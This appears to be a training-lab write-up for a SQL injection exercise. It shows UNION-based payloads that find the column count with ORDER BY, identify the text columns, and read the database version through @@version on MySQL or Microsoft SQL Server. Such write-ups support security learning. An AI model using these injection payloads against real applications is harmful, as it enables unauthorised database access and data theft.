## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234119364-69968631-e4f5-4a1c-89f3-3af9fb42532d.png)

![image](https://user-images.githubusercontent.com/67383098/234121250-b5ef9cbb-d132-4888-82aa-bd4c1d6ad88f.png)


## Solution :

> NOTE - Since it is either microsoft or MYQL db use **#** as comment 

#### Determine no of columns -

**ORDER BY 3** gives error which means there are 2 columns.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 #
```

![image](https://user-images.githubusercontent.com/67383098/234120375-cfe16e43-14f2-4786-8964-453c97ab8952.png)

#### Determine column which has text data -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'shebu','cys' #
```

Both the columns have text data since both returns the same i/p value.

![image](https://user-images.githubusercontent.com/67383098/234121081-4e5f067b-4bcc-485a-9ef7-6f4a6438c4f8.png)

#### Retreive db version 

The syntax to find version info of both MYSQL & Microsoft db are the same - `@@version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT @@version,NULL #
```
![image](https://user-images.githubusercontent.com/67383098/234122059-225e45dd-1ae2-482d-95f6-1cc990dc2da6.png)

![image](https://user-images.githubusercontent.com/67383098/234122101-b1a2b88b-2e38-4d3b-8137-406bef3484b1.png)


